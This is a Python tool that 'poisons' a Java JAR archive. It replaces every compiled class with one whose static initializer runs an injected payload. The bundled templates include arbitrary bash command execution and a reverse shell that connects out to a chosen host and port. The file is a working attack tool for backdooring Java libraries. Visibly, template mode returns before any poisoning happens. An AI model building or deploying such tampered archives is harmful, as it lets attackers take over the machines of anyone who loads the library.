#!/usr/bin/env python3

from argparse import ArgumentParser
from zipfile import ZipFile
import tempfile
from os import mkdir
from os.path import commonprefix, realpath, join
from pathlib import Path
from subprocess import run
import json
import re

def prepare_template(s):
    s = s.replace('{', '{{').replace('}', '}}')
    s = re.sub(r'\$(\w+)\$', r'{\1}', s)
    return s

PAYLOAD_TEMPLATES = {
    'default': 'System.out.println("pwned!");',
    'cmd': prepare_template('''
try {
    ProcessBuilder builder = new ProcessBuilder(new String[]{"bash", "-c", "$cmd$"});
    Process process = builder.start();

    // Capture and print stdout
    java.io.BufferedReader stdoutReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
    String line;
    while ((line = stdoutReader.readLine()) != null) {
        System.out.println(line);
    }

    // Capture and print stderr
    java.io.BufferedReader stderrReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getErrorStream()));
    while ((line = stderrReader.readLine()) != null) {
        System.err.println(line);
    }

    process.waitFor();
} catch (Exception e) {
    e.printStackTrace();
    System.out.println(e);
}
'''),
    'revshell': prepare_template('''
String host = "$host$";
int port = $port$;
String cmd = "sh";
try {
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host, port);
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
        while (pi.available() > 0)
            so.write(pi.read());
        while (pe.available() > 0)
            so.write(pe.read());
        while (si.available() > 0)
            po.write(si.read());
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
            p.exitValue();
            break;
        } catch (Exception e) {}
    }
    p.destroy();
    s.close();
} catch (Exception e) {}'''),
}
PAYLOAD = PAYLOAD_TEMPLATES['default']

def check_path(safe_dir, requested_path):
    safe_dir = realpath(safe_dir) + '/'
    requested_path = realpath(requested_path)
    if commonprefix([safe_dir, requested_path]) != safe_dir:
        raise ValueError(f'Path {requested_path} is not in safe directory {safe_dir}')
    return requested_path

def check_path_rel(safe_dir, requested_path_rel):
    return check_path(safe_dir, join(safe_dir, requested_path_rel))

def mkdirs(base_path, rel_path):
    dst_path = check_path_rel(base_path, rel_path)
    Path(dst_path).mkdir(parents=True, exist_ok=True)

def create_poisoned_class(temp_dir, path):
    parts = path.split('/')
    class_name = parts[-1].replace('.class', '')
    package = '.'.join(parts[:-1])

    package_path = '/'.join(parts[:-1])
    mkdirs(temp_dir, package_path)

    class_source = f'''
package {package};

public class {class_name} {{
    static {{
        {PAYLOAD}
    }}
}}
'''
    class_path = check_path_rel(temp_dir, join(package_path, class_name + '.java'))
    with open(class_path, 'w') as f:
        f.write(class_source)

    run(['javac', class_path], check=True, cwd=temp_dir)

    compiled_path = check_path_rel(temp_dir, join(package_path, class_name + '.class'))
    with open(compiled_path, 'rb') as f:
        return f.read()

def poison_jar(input_jar, output_jar):
    print(f'Poisoning {input_jar} to {output_jar}')

    input_jar = ZipFile(input_jar, 'r')
    output_jar = ZipFile(output_jar, 'w')
    temp_dir = tempfile.TemporaryDirectory()

    for entry in input_jar.infolist():
        if entry.is_dir():
            print(f'Dir {entry.filename}')
            output_jar.mkdir(entry.filename)
        elif entry.filename.endswith('.class') and not entry.filename.endswith('package-info.class'):
            print(f'Poisoning {entry.filename}')
            poisoned_class = create_poisoned_class(temp_dir.name, entry.filename)
            output_jar.writestr(entry, poisoned_class)
        else:
            print(f'Copying {entry.filename}')
            output_jar.writestr(entry, input_jar.read(entry))

def main():
    parser = ArgumentParser(description='Poison a JAR file')
    parser.add_argument('input', type=str, help='JAR file to poison')
    parser.add_argument('output', type=str, help='Output JAR file')
    parser.add_argument('-p', '--payload', type=str, help='Payload to inject')
    parser.add_argument('-t', '--template', type=str, help='Payload template')
    parser.add_argument('-a', '--template-args', nargs='*', type=str, help='Payload template arguments')
    parser.add_argument('-l', '--list-templates', action='store_true', help='List available payload templates')
    args = parser.parse_args()

    if args.list_templates:
        print('Available payload templates:')
        for name, template in PAYLOAD_TEMPLATES.items():
            print('-' * 20)
            print(f'Name: {name}')
            print('Template:')
            print('------')
            print(template.strip())
        return

    global PAYLOAD
    if args.payload and args.template:
        raise ValueError('Cannot specify both payload and template')
    if args.payload:
        PAYLOAD = args.payload
    elif args.template:
        if args.template not in PAYLOAD_TEMPLATES:
            raise ValueError(f'Unknown template: {args.template}')
        PAYLOAD = PAYLOAD_TEMPLATES[args.template]
        if args.template_args:
            for arg in args.template_args:
                key, value = arg.split('=', 1)
                PAYLOAD = PAYLOAD.format(**{key: value})
        return
    
    poison_jar(args.input, args.output)

if __name__ == '__main__':
    main()
